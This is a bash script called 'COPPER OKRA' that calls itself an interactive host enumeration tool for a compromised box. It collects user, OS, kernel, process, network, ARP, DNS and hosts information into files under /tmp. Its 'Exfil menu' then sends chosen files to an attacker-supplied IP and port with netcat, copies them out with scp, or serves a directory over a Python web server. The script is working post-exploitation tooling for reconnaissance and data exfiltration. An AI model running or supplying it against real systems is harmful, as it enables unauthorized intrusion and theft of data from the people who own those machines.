#!/bin/bash

#--- Remove cursor ---#
tput civis
trap 'tput cnorm' EXIT

username=$(id -u -n)

shell () {
	echo -e "\n$username@cookd>>> "
}

cs () {
	clear
}

nl () {
	echo -e " "
}

cooked () {
	echo -e '                    )   (\n                 ( /(   )\ )\n    (   (    (   )\()) (()/(\n    )\  )\   )\ ((_)\  ((_))\n   ((_)((_) ((_)| |(_) _| |\n  / _|/ _ \/ _ \| / // _` |\n  \__|\___/\___/|_\_\\\__,_|\n----- this box is cooked -----\n'
}

format () {
	cs
	cooked
}

menu () {
	echo -e "[ 1 ] Host enumeration\n"
	echo -e "[ 2 ] Network enumeration\n"
	echo -e "[ 3 ] Host/Network enumeration\n"
	echo -e "[ 4 ] Exfil menu (Only select after enumeration)\n"
	echo -e "[ 5 ] Exit\n"
}

netmenu () {
	echo -e "[ 1 ] netcat file share\n"
	echo -e "[ 2 ] scp\n"
	echo -e "[ 3 ] python webserver\n"
	echo -e "[ 4 ] Exit\n"
}

loading() {
	local text="Please wait"
	local reps=0
	local max_reps=3
	while [ $reps -lt $max_reps ]; do
		echo -ne "${text}.  \r"
		sleep 0.25
		echo -ne "${text}.. \r"
		sleep 0.25
		echo -ne "${text}...\r"
		sleep 0.25
		echo -ne "${text}   \r"
		sleep 0.25
		((reps++))
	done
}

#--- Landing page ---#
format
echo -e "Welcome to COPPER OKRA! An interactive host enumeration script!\n"

read -n 1 -s -r -p "Press any key to continue! "

#--- Dependency/tool checks ---#
format
echo -e "Beginning tool check...\n"
echo -e "\e[31mWARNING\e[0m: Missing tools may lead to decreased functionality...\n"
loading
format

#--- Put tools into array ---#
#--- To add/remove tool checks, simply edit the array and the corresponding case statement ---#

#--- For general utilities ---#
declare -a toollist=("nc" "scp" "ssh" "python3" "ip" "ping" "tar")

#--- For compression utilities ---#
declare -a comp=("tar" "zip" "gzip")

#--- Check for utilities ---#
format
echo -e "Checking for utility binaries...\n"
loading
format

#--- Iterate through array to check if tool is present on machine ---#
for tool in "${toollist[@]}"; do
	case "$tool" in
		nc)
			type nc &> /dev/null && echo -e "$tool is here...\n" || echo -e "$tool is not here...\n"
			;;
		scp)
			type scp &> /dev/null && echo -e "$tool is here...\n" || echo -e "$tool is not here...\n"
			;;
		python3)
			type python3 &> /dev/null && echo -e "$tool is here...\n" || echo -e "$tool is not here...\n"
			;;
		ip)
			type ip &> /dev/null && echo -e "$tool is here...\n" || echo -e "$tool is not here...\n"
			;;
		ssh)
			type ssh &> /dev/null && echo -e "$tool is here...\n" || echo -e "$tool is not here...\n"
			;;
		ping)
			type ping &> /dev/null && echo -e "$tool is here...\n" || echo -e "$tool is not here...\n"
			;;
		tar)
			type tar &> /dev/null && echo -e "$tool is here...\n" || echo -e "$tool is not here...\n"
			;;
		*)
			echo -e "$tool is not found...\n"
			;;
	esac
	sleep 0.25
done
sleep 2

#--- Iterate through array to check if comp tool is present ---#
format
echo -e "Checking for file compression tools...\n"
loading
format

for zipper in "${comp[@]}"; do
	case "$zipper" in
		zip)
			type zip &> /dev/null && echo -e "$zipper is here...\n" || echo -e "$zipper is not downloaded...\n"
			;;
		tar)
			type tar &> /dev/null && zip2=tar && echo -e "$zipper is here...\n" || echo -e "$zipper is not downloaded...\n"
			;;
		gzip)
			type gzip &> /dev/null && echo -e "$zipper is here...\n" || echo -e "$zipper is not downloaded...\n"
			;;
		*)
			echo -e "$zipper is an unknown compression utility\n"
			;;
	esac
	sleep 0.25
done	
sleep 4

format
echo -e "We have found the following compression utilities!\n"

[[ -n "${zip1}" ]] && echo -e "- zip\n"
[[ -n "${zip2}" ]] && echo -e "- tar\n"
[[ -n "${zip3}" ]] && echo -e "- gzip\n"

read -p "Please select your compression utility: $(shell)" computil

format
echo -e "You've selected $computil!"
sleep 3

format
echo -e "Tool check complete!"
sleep 2

#--- Start main "loop" ---#
format
read -rep "Name your working directory:\n\nExample: newdir\n$(shell)" dir

#--- Create path variables ---#
hostpath=/tmp/$dir/hostinfo.ckd
netpath=/tmp/$dir/netinfo.ckd

#--- Check to see if dir already exists ---#
if [ -d /tmp/$dir ]; then
	format
	echo -e "ERROR: /tmp/$dir already exists!\n"
	read -p "Do you want to wipe /tmp/$dir and replace it? Y/n\n$(shell)" ans
	if [[ $ans =~ ^[Yy]$ ]]; then
		format
		echo -e "Removing and replacing /tmp/$dir"
		rm -rf /tmp/$dir
		mkdir /tmp/$dir
		sleep 3
	elif [[ $ans =~ ^[Nn]$ ]]; then
		format
		read -p "Name your working directory:\n$(shell)" dir
		if [ -d /tmp/$dir ]; then
			format
			echo -e "ERROR: /tmp/$dir already exists!\nExiting!\nPlease try again with a directory that does not exist!"
			sleep 3
			exit
		fi
	else
		format
		echo -e "$ans is unrecognized!"
		nl
		read -p "Name your working directory:\n$(shell)" dir
	fi
else
	format
	echo -e "/tmp/$dir does not exist!\nCreating your directory!\nFile path = /tmp/$dir\n"
	mkdir /tmp/$dir
	loading
	format
	echo -e "Creating /tmp/$dir/hostinfo.ckd and /tmp/$dir/netinfo.ckd!\n"
	touch /tmp/$dir/hostinfo.ckd
	touch /tmp/$dir/netinfo.ckd
	loading
fi

#--- Option menu ---#
loop=1
while [[ $loop = 1 ]]; do
	format
	menu
	read -p "Please select an option!\n$(shell)" opt

	if [[ $opt = 1 ]]; then
		#--- Print landing for enum ---#
		format
		echo -e "Gathering some basic host information...\n"
		echo -e "Complete information available at /tmp/$dir/hostinfo.ckd!\n"
		loading

		#--- Outputting accessible information to the screen --- 
		format
		echo -e "Your username is: "; /usr/bin/whoami
		user="$(/usr/bin/whoami)"
		nl
		echo -e "Your hostname is: "; /usr/bin/hostname
		host="$(/usr/bin/hostname)"
		nl
		echo -e "Your OS is: "
		if grep -q "Ubuntu" /etc/*-release; then
			echo "Ubuntu"
			OS=Ubuntu
		elif grep -q "Kali" /etc/*-release; then
			echo "Kali"
			OS=Kali
		fi
		nl

		#--- Formatting/writing to host file ---
		echo -e "----- Host info -----" > $hostpath
		echo "" >> $hostpath
		echo -e "--- user@host ---" >> $hostpath
		echo -e "$user@$host\n" >> $hostpath
		echo -e "--- OS Information ---" >> $hostpath
		cat /etc/*-release >> $hostpath
		echo "" >> $hostpath
		echo -e "--- Kernel Information ---" >> $hostpath
		cat /proc/version >> $hostpath
		echo "" >> $hostpath
		echo -e "--- Active users ---" >> $hostpath
		w >> $hostpath
		echo "" >> $hostpath
		echo -e "--- Active Processes ---" >> $hostpath
		ps -aux >> $hostpath

		echo -e "\nRedirecting you back to the main menu..."
		loading
	elif [[ $opt = 2 ]]; then
		#--- Print landing for enum ---#
		format
		echo -e "Gathering some basic network information...\n"
		echo -e "Complete information available at /tmp/$dir/netinfo.ckd!\n"
		loading

		#--- Outputting accessible information to the screen ---
		format
		echo -e "--- Network interfaces ---"
		nl
		ip link show
		nl
		echo -e "--- IP addresses ---"
		nl
		ip -br a
		nl

		#--- Formatting/writing to net file ---
		echo -e "----- Net info -----" > $netpath
		echo "" >> $netpath
		echo -e "--- Network interfaces ---" >> $netpath
		ip link show >> $netpath
		echo "" >> $netpath
		echo -e "--- IP addresses ---" >> $netpath
		ip -br a >> $netpath
		echo "" >> $netpath
		echo -e "--- Route information ---" >> $netpath
		ip r >> $netpath
		echo "" >> $netpath
		echo -e "--- ARP table ---" >> $netpath
		ip n >> $netpath
		echo "" >> $netpath
		echo -e "--- DNS information ---" >> $netpath
		cat /etc/resolv.conf >> $netpath
		echo "" >> $netpath
		echo -e "--- Hostname information ---" >> $netpath
		cat /etc/hosts >> $netpath

		echo -e "\nRedirecting you back to the main menu..."
		loading
	elif [[ $opt = 3 ]]; then
		#--- Print landing for enum ---#
		format
		echo -e "Gathering some basic network and host information...\n"
		echo -e "Complete information available at /tmp/$dir/{host,net}info.ckd!\n"
		loading

		#--- Outputting accessible information to the screen ---
		format
		echo -e "Your username is: "; /usr/bin/whoami
		user="$(/usr/bin/whoami)"
		nl
		echo -e "Your hostname is: "; /usr/bin/hostname
		host="$(/usr/bin/hostname)"
		nl
		echo -e "Your OS is: "
		if grep -q "Ubuntu" /etc/*-release; then
			echo "Ubuntu"
			OS=Ubuntu
		elif grep -q "Kali" /etc/*-release; then
			echo "Kali"
			OS=Kali
		fi
		nl

		#--- Formatting/writing to host file ---
		echo -e "----- Host info -----" > $hostpath
		echo "" >> $hostpath
		echo -e "--- user@host ---" >> $hostpath
		echo -e "$user@$host\n" >> $hostpath
		echo -e "--- OS Information ---" >> $hostpath
		cat /etc/*-release >> $hostpath
		echo "" >> $hostpath
		echo -e "--- Kernel Information ---" >> $hostpath
		cat /proc/version >> $hostpath
		echo "" >> $hostpath
		echo -e "--- Active users ---" >> $hostpath
		w >> $hostpath
		echo "" >> $hostpath
		echo -e "--- Active Processes ---" >> $hostpath
		ps -aux >> $hostpath

		#--- Formatting/writing to net file ---
		echo -e "----- Net info -----" > $netpath
		echo "" >> $netpath
		echo -e "--- Network interfaces ---" >> $netpath
		ip link show >> $netpath
		echo "" >> $netpath
		echo -e "--- IP addresses ---" >> $netpath
		ip -br a >> $netpath
		echo "" >> $netpath
		echo -e "--- Route information ---" >> $netpath
		ip r >> $netpath
		echo "" >> $netpath
		echo -e "--- ARP table ---" >> $netpath
		ip n >> $netpath
		echo "" >> $netpath
		echo -e "--- DNS information ---" >> $netpath
		cat /etc/resolv.conf >> $netpath
		echo "" >> $netpath
		echo -e "--- Hostname information ---" >> $netpath
		cat /etc/hosts >> $netpath

		echo -e "\nRedirecting you back to the main menu..."
		loading
	elif [[ $opt = 4 ]]; then
		loop=2
		while [[ $loop = 2 ]]; do
			format
			netmenu
			read -p "Please select an option!\n$(shell)" netopt

			if [[ $netopt = 1 ]]; then
				format
				echo -e "Redirecting to netcat file share...\n"
				sleep 2
				format
				read -p "Please enter the IP address for exfil:\n$(shell)" address
				nl
				read -p "Please enter the port number for exfil:\n$(shell)" port
				nl
				read -p "Please enter the file name for exfil:\n$(shell)" file
				nl
				echo -e "Initializing transfer for $file...\n"
				loading
				nc $address $port < $file
				echo -e "File sent!\n"
				loop=1
			elif [[ $netopt = 2 ]]; then
				format
				echo -e "Redirecting to scp exfil...\n"
				sleep 2
				format
				read -p "Please enter the file name for exfil:\n$(shell)" file
				nl
				read -p "Please enter your username for scp exfil:\n$(shell)" scpuser
				nl
				read -p "Please enter the target IP address:\n$(shell)" address
				nl
				read -p "Please enter the target port number:\n$(shell)" port
				nl
				read -p "Please enter the target directory:\n$(shell)" targetdir
				nl
				echo -e "Initializing transfer for $file...\n"
				loading
				scp -P $port $file $scpuser@$address:$targetdir
				echo -e "File sent!\n"
				loop=1
			elif [[ $netopt = 3 ]]; then
				format
				echo -e "Redirecting to python web server exfil...\n"
				sleep 2
				format
				read -p "Please enter the target directory for exfil:\n$(shell)" targetdir
				nl
				echo -e "Initializing Python web server in $targetdir...\n"
				loading
				cd $targetdir && python3 -m http.server
				echo -e "File server started! Files available at: http://<target IP>:8000\n"
				loop=1
			elif [[ $netopt = 4 ]]; then
				format
				echo -e "Exiting exfil menu...\n"
				loading
				loop=1
			else
				format
				echo -e "$netopt is not recognized!"
				loading
			fi
		done
	elif [[ $opt = 5 ]]; then
		format
		echo -e "Exiting...\n"
		loading
		exit
	else
		format
		echo -e "$opt is not recognized!"
		loading
	fi
done
